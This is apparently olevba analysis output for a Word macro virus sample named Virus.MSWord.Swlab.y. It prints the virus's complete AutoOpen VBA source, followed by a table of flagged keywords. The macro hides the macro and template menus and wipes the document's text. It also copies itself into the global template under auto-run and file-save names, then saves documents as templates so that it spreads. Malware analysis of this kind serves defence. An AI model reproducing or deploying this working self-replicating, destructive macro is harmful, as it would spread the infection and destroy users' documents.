olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Swlab.y
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Swlab.y - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Swlab.y - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim FName$
Dim MacName$
Dim Hello
Dim world
Dim try
Dim this
Dim virus
Rem SkamWerks Labs Presents the DestructionConcept Created by SuperTech

Rem Run Payload, Copy Macros to Template.
On Error GoTo -1: On Error GoTo ErrorHandler

     If WordBasic.[MenuItemText$]("&Tools", 0, 13, 0) = "&Macro..." Then
          WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="&File", Context:=0, Remove:=1
          WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="&Tools", Context:=0, Remove:=1
          WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="&File", Context:=0, Remove:=1, MenuType:=1
          WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="&File", Context:=0, Remove:=1, MenuType:=1
     End If

Rem Virus Payload Area.

     WordBasic.FileSummaryInfo Subject:="Hello jerk, have fun, he he he"
     WordBasic.EditReplace Find:="*.*", Replace:="", ReplaceAll:=1, Wrap:=1
     WordBasic.AppHide "Program Manager"
     FName$ = WordBasic.[FileName$]()
     MacName$ = FName$ + ":AutoOpen"

     If WordBasic.[MacroFileName$]("AutoOpen") = "" Then GoTo EndCode
     WordBasic.MacroCopy MacName$, "Global:AutoOpen", 1
     WordBasic.MacroCopy MacName$, "Global:AutoClose", 1
     WordBasic.MacroCopy MacName$, "Global:AutoExec", 1
     WordBasic.MacroCopy MacName$, "Global:AutoNew", 1
     WordBasic.MacroCopy MacName$, "Global:AutoExit", 1
     WordBasic.MacroCopy MacName$, "Global:FileNew", 1
     WordBasic.MacroCopy MacName$, "Global:FileOpen", 1
     WordBasic.MacroCopy MacName$, "Global:FileClose", 1
     WordBasic.MacroCopy MacName$, "Global:FileSave", 1
     WordBasic.MacroCopy MacName$, "Global:FileSaveAs", 1
     WordBasic.MacroCopy MacName$, "Global:FileSaveAll", 1
     WordBasic.MacroCopy MacName$, "Global:Htech", 1

ErrorHandler:

Rem Copy Macro(s) from Template to the Document

On Error GoTo -1: On Error GoTo AutoOpenHandler
     MacName$ = FName$ + ":AutoOpen"
     WordBasic.MacroCopy "Global:AutoOpen", MacName$, 1
AutoOpenHandler:

On Error GoTo -1: On Error GoTo AutoCloseHandler
    MacName$ = FName$ + ":AutoClose"
     WordBasic.MacroCopy "Global:AutoClose", MacName$, 1
AutoCloseHandler:

On Error GoTo -1: On Error GoTo AutoExecHandler
     MacName$ = FName$ + ":AutoExec"
     WordBasic.MacroCopy "Global:AutoExec", MacName$, 1
AutoExecHandler:

On Error GoTo -1: On Error GoTo AutoNewHandler
     MacName$ = FName$ + ":AutoNew"
      WordBasic.MacroCopy "Global:AutoNew", MacName$, 1
AutoNewHandler:

On Error GoTo -1: On Error GoTo AutoExitHandler
     MacName$ = FName$ + ":AutoExit"
     WordBasic.MacroCopy "Global:AutoExit", MacName$, 1
AutoExitHandler:

On Error GoTo -1: On Error GoTo FileNewHandler
     MacName$ = FName$ + ":FileNew"
     WordBasic.MacroCopy "Global:FileNew", MacName$, 1
FileNewHandler:

On Error GoTo -1: On Error GoTo FileOpenHandler
     MacName$ = FName$ + ":FileOpen"
     WordBasic.MacroCopy "Global:FileOpen", MacName$, 1
FileOpenHandler:

On Error GoTo -1: On Error GoTo FileCloseHandler
     MacName$ = FName$ + ":FileClose"
     WordBasic.MacroCopy "Global:FileClose", MacName$, 1
FileCloseHandler:

On Error GoTo -1: On Error GoTo FileSaveHandler
     MacName$ = FName$ + ":FileSave"
     WordBasic.MacroCopy "Global:FileSave", MacName$, 1
FileSaveHandler:

On Error GoTo -1: On Error GoTo FileSaveAsHandler
     MacName$ = FName$ + ":FileSaveAs"
     WordBasic.MacroCopy "Global:FileSaveAs", MacName$, 1
FileSaveAsHandler:

On Error GoTo -1: On Error GoTo FileSaveAllHandler
     MacName$ = FName$ + ":FileSaveAll"
     WordBasic.MacroCopy "Global:FileSaveAll", MacName$, 1
FileSaveAllHandler:

On Error GoTo -1: On Error GoTo OtherNameHandler
     MacName$ = FName$ + ":Htech"
     WordBasic.MacroCopy "Global:Htech", MacName$, 1
OtherNameHandler:

Rem Save Document as Template
If WordBasic.[FileName$]() <> "" Then
     WordBasic.FileSaveAs Format:=1
End If

Rem Hello world, try this virus WordBasic.OK'.
On Error GoTo -1: On Error GoTo 0:
On Error GoTo -1: On Error GoTo EndCode:



EndCode:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

